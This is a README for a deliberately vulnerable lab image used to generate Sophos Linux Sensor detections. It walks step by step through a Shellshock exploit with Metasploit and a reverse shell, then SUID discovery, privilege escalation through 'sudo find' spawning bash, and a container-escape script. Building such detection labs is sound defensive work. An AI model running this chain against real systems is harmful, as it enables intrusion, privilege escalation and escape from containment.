# sophShock

This image is for generating Sophos Linux Sensor detections.
For testing purposes only, advised not to run this in a public facing manner.

#Walk Thru

-Metasploit:
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOST <ip addr>
set RPORT 8080
set LHOST <ip addr>
set LPORT <reverse listening port>
set TARGETURI /cgi-bin/shockme.cgi 
run 

-establish tty
python -c 'import pty; pty.spawn("/bin/bash")'

-switch to user with sudo privileges
 (will add recon file with pw for sophy user in next update)

-find files with SUID bit set
find / -perm -4000 2>/dev/null

-exploit find binary
sudo find . -exec /bin/bash -i \; -quit
(interactive shell detection from SLS)

- run escape.sh from root directory
(userland container escape detection)



#references:
- https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
- https://github.com/SecurityWeekly/vulhub-lab/tree/master/bash/shellshock
